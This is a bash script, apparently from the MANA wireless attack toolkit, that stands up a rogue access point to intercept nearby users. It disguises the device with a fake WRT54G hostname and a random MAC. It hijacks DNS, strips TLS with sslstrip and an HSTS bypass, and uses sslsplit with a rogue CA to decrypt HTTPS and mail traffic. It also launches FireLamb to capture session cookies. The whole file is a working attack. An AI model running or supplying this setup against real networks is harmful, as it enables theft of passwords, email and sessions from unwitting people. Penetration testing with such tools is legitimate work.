#!/bin/bash

upstream=wlan0
phy=wlan1
conf=/etc/mana-toolkit/hostapd-karma.conf
hostapd=/usr/lib/mana-toolkit/hostapd

hostname WRT54G
echo hostname WRT54G
sleep 2

#service network-manager stop
rfkill unblock wlan

ifconfig $phy down
macchanger -r $phy
ifconfig $phy up

sed -i "s/^interface=.*$/interface=$phy/" $conf
$hostapd $conf&
sleep 5
ifconfig $phy 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

dhcpd -cf /etc/mana-toolkit/dhcpd.conf $phy

echo '1' > /proc/sys/net/ipv4/ip_forward
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -F
iptables -t nat -F
iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
#iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1

#SSLStrip with HSTS bypass
cd /usr/share/mana-toolkit/sslstrip-hsts/
python sslstrip.py -l 10000 -a -w /var/lib/mana-toolkit/sslstrip.log&
iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
python dns2proxy.py $phy&
cd -

#SSLSplit
sslsplit -D -P -Z -S /var/lib/mana-toolkit/sslsplit -c /usr/share/mana-toolkit/cert/rogue-ca.pem -k /usr/share/mana-toolkit/cert/rogue-ca.key -O -l /var/lib/mana-toolkit/sslsplit-connect.log \
 https 0.0.0.0 10443 \
 http 0.0.0.0 10080 \
 ssl 0.0.0.0 10993 \
 tcp 0.0.0.0 10143 \
 ssl 0.0.0.0 10995 \
 tcp 0.0.0.0 10110 \
 ssl 0.0.0.0 10465 \
 tcp 0.0.0.0 10025&
#iptables -t nat -A INPUT -i $phy \
 #-p tcp --destination-port 80 \
 #-j REDIRECT --to-port 10080
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 443 \
 -j REDIRECT --to-port 10443
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 143 \
 -j REDIRECT --to-port 10143
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 993 \
 -j REDIRECT --to-port 10993
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 65493 \
 -j REDIRECT --to-port 10993
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 465 \
 -j REDIRECT --to-port 10465
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 25 \
 -j REDIRECT --to-port 10025
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 995 \
 -j REDIRECT --to-port 10995
iptables -t nat -A PREROUTING -i $phy \
 -p tcp --destination-port 110 \
 -j REDIRECT --to-port 10110

# Start FireLamb
/usr/share/mana-toolkit/firelamb/firelamb.py -i $phy &

#echo "Hit enter to kill me"
#read
#pkill dhcpd
#pkill sslstrip
#pkill sslsplit
#pkill hostapd
#pkill python
#iptables --policy INPUT ACCEPT
#iptables --policy FORWARD ACCEPT
#iptables --policy OUTPUT ACCEPT
#iptables -t nat -F
